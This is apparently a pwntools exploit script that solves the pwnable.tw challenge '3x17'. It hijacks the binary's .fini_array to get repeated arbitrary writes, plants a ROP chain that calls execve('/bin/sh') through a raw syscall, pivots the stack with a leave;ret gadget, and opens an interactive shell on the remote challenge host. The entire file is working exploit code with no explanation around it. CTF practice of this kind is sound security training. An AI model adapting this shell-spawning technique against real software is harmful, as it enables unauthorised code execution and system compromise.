from pwn import *

local = 0

pop_rsi = 0x0000000000406c30
pop_rdi = 0x0000000000401696
pop_rdx = 0x0000000000446e35
pop_rax = 0x000000000041e4af
leave_ret = 0x0000000000401c4b
ret = 0x0000000000401016
libc_csu_fini = 0x0000000000402960
main = 0x0000000000401b6d
syscall = 0x00000000004022b4

fini_array = 0x00000000004b40f0
rop_address = fini_array + 2 * 8
bin_sh = rop_address + 9 * 8	

if local:
	s = process('./3x17')
	raw_input('DEBUG')
else:
	s = remote('chall.pwnable.tw', 10105)

def write(addr, value):
	s.sendafter(b'addr:', bytes(str(addr), 'utf-8'))
	s.sendafter(b'data:', value)


write(fini_array, p64(libc_csu_fini) + p64(main))

rop_chain = [pop_rdx, 0, pop_rsi, 0, pop_rdi, bin_sh, pop_rax, 0x3b, syscall]

for i in range(len(rop_chain)):
	write(rop_address + i * 8, p64(rop_chain[i]))

write(bin_sh, b'/bin/sh\x00')
write(fini_array, p64(leave_ret) + p64(ret))

s.interactive()
